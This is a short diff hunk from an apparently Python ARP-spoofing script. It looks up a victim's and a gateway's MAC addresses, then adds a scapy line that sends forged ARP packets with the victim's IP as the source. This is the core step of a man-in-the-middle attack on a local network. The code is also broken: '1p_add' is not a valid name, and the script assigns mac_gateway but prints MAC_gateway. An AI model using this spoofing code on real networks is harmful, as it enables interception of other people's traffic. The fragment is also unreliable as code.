@@ -47,3 +47,6 @@ print "MAC_victim     : "+MAC_victim
 mac_gateway = parser_MAC(gateway)
 print "MAC_gateway    : "+MAC_gateway
 
+
+
+send(ARP(op=ARP.who_has, pdst=1p_add, psrc=victim_ip, hwdst=mac_add))
